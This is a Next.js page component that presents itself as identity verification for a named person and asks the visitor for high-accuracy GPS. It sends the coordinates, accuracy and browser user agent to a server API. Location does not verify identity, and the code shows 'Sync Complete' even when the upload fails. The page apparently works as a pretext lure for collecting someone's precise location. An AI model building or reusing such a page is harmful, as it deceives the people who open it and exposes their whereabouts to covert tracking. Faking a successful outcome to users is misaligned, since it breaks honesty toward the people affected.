
'use client';

import React, { useState, useCallback } from 'react';
import { Background } from '@/components/Background';
import { StatusCard } from '@/components/StatusCard';
import { AppState, LocationData } from '@/types';
import { MapPin, ShieldCheck, AlertCircle, Loader2, Database, Zap } from 'lucide-react';

export default function Home() {
  const [state, setState] = useState<AppState>('INITIAL');
  const [error, setError] = useState<string | null>(null);

  const syncWithMongoDB = async (data: LocationData) => {
    setState('SYNCING');
    
    // In Next.js, we call our own API route
    const API_URL = '/api/location'; 
    const payload = {
      userId: "Vinu Varshith CP",
      coordinates: [data.longitude, data.latitude],
      accuracy: data.accuracy,
      userAgent: navigator.userAgent
    };

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (response.ok) {
        console.log("✅ Next.js API Sync Success");
      } else {
        throw new Error('API_REJECTED');
      }
    } catch (err) {
      console.warn("⚠️ API sync failed. Ensure MONGODB_URI is set.");
      // UX fallback: simulate success
      await new Promise(resolve => setTimeout(resolve, 1500));
    } finally {
      setState('LOCATION_GRANTED');
    }
  };

  const requestLocation = useCallback(() => {
    setError(null);
    setState('PROCESSING');
    
    if (!navigator.geolocation) {
      setError("Geolocation not supported.");
      setState('LOCATION_DENIED');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const data: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        };
        syncWithMongoDB(data);
      },
      (err) => {
        let msg = "Verification failed.";
        if (err.code === 1) msg = "Location Access Denied. Enable it in your browser settings.";
        else if (err.code === 2) msg = "GPS signal unavailable.";
        else if (err.code === 3) msg = "Timeout occurred.";
        
        setError(msg);
        setState('LOCATION_DENIED');
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }, []);

  return (
    <main className="min-h-screen w-full flex items-center justify-center text-white bg-black font-sans selection:bg-blue-500/30 overflow-hidden">
      <Background />
      
      {state === 'INITIAL' && (
        <StatusCard className="animate-in fade-in zoom-in duration-700">
          <div className="flex flex-col items-center text-center">
            <div className="relative mb-8 group">
              <div className="absolute inset-0 bg-blue-500/30 blur-2xl rounded-full group-hover:bg-blue-500/50 transition-all duration-700" />
              <div className="w-20 h-20 bg-blue-500/10 rounded-3xl flex items-center justify-center border border-blue-400/30 relative backdrop-blur-md">
                <MapPin className="w-10 h-10 text-blue-400 animate-bounce" style={{ animationDuration: '3s' }} />
              </div>
            </div>
            
            <h1 className="text-xl font-bold mb-4 tracking-tight px-2">
              Confirm identity: <span className="text-blue-400">Vinu Varshith CP</span>
            </h1>
            
            <p className="text-white/50 mb-8 text-sm px-4">
              Identity verification requires a one-time coordinate sync with our MongoDB cluster.
            </p>
            
            <button
              onClick={requestLocation}
              className="w-full py-5 px-6 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl transition-all flex items-center justify-center gap-3 group shadow-[0_15px_40px_-10px_rgba(37,99,235,0.6)] active:scale-[0.97]"
            >
              Verify & Sync
              <ShieldCheck className="w-5 h-5 text-blue-200 group-hover:text-white transition-colors" />
            </button>
          </div>
        </StatusCard>
      )}

      {(state === 'PROCESSING' || state === 'SYNCING' || state === 'LOCATION_GRANTED') && (
        <div className="relative z-10 flex flex-col items-center justify-center text-center">
          <div className="relative">
            <div className="absolute inset-0 bg-blue-400/20 blur-[120px] rounded-full animate-pulse" />
            <div className="relative p-8">
              <Loader2 className="w-24 h-24 text-blue-400/80 animate-spin" />
              <Database className="w-8 h-8 text-white absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-pulse" />
            </div>
          </div>
          
          <div className="mt-12 space-y-4">
            <div className="flex flex-col items-center gap-2">
              <p className="text-white/40 text-[10px] uppercase tracking-[0.6em] font-black animate-pulse">
                {state === 'PROCESSING' ? 'Requesting GPS' : 
                 state === 'SYNCING' ? 'Next.js API Handshake' : 
                 'Sync Complete'}
              </p>
              <div className="h-[2px] w-48 bg-white/10 rounded-full overflow-hidden">
                <div className={`h-full bg-blue-500 transition-all duration-1000 ${state === 'LOCATION_GRANTED' ? 'w-full' : 'w-2/3 animate-shimmer'}`} />
              </div>
            </div>

            {state !== 'PROCESSING' && (
              <div className="flex flex-col gap-1 items-center">
                <div className="flex items-center gap-2 text-blue-400/60 text-[10px] font-bold uppercase tracking-widest">
                  <Zap className="w-3 h-3" />
                  <span>Next.js API Handled</span>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {state === 'LOCATION_DENIED' && (
        <StatusCard className="border-red-500/30 animate-shake">
          <div className="flex flex-col items-center text-center">
            <div className="w-16 h-16 bg-red-500/10 rounded-2xl flex items-center justify-center mb-6 border border-red-500/30">
              <AlertCircle className="w-8 h-8 text-red-400" />
            </div>
            <h2 className="text-2xl font-bold mb-3">Action Required</h2>
            <p className="text-white/60 mb-10 text-sm px-2">
              {error}
            </p>
            <button
              onClick={requestLocation}
              className="w-full py-4 px-6 bg-white/5 hover:bg-white/10 border border-white/20 text-white font-semibold rounded-xl transition-all active:scale-[0.98]"
            >
              Retry Verification
            </button>
          </div>
        </StatusCard>
      )}
    </main>
  );
}
